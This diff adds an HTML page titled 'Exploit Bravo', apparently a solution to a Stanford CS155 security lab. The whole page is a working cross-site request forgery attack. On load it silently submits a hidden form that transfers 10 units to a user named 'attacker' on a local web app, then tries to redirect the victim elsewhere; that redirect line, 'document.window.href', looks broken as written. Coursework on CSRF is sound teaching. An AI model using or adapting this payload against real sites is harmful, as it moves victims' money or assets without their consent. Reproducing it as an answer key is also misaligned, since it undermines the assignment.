@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+    <meta charset="utf-8"/>
+    <head>
+        <title>Exploit Bravo</title>
+        <script>
+            var submitted = false;
+            window.onload = function() {
+                document.getElementById("csrf_form").submit();
+                submitted = true;
+            }
+
+            function submitSucceed() {
+                if (submitted) {
+                       document.window.href = "https://cs155.stanford.edu/"
+                }
+            }
+
+        </script>
+    </head>
+
+    <body >
+        <form hidden  id="csrf_form" method="POST" action="http://localhost:3000/post_transfer" target = "submit_frame">
+            <input name="destination_username" value="attacker">
+            <input name="quantity" value="10">
+        </form>
+        <iframe hidden name='submit_frame' onload = "submitSucceed()"></iframe>
+        
+    </body>
+</html>
